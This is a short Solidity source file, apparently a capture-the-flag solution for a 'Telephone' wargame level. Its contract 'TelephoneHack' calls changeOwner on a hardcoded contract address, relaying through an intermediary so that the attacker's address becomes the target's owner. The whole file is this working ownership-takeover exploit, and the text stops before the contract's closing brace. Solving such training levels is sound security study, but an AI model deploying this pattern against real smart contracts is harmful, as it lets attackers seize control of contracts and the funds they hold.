pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}
contract TelephoneHack {
    Telephone telephone = Telephone(0x3b819452A83642d25919456F09d5a05Dad3cB6e5);
    function change() public{
        telephone.changeOwner(msg.sender);
    }